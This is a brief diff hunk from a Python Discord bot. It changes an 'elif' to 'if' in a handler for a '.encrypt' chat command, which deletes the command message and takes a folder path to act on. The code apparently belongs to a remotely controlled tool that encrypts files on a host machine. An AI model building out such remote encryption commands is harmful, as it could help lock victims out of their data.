@@ -4,7 +4,7 @@ import psutil
 from getpass import getuser
 import asyncio
 
-elif message.content.startswith('.encrypt'):
+if message.content.startswith('.encrypt'):
     await message.delete()
     folder_path = message.content[8:].strip().strip('"').strip("'")
     
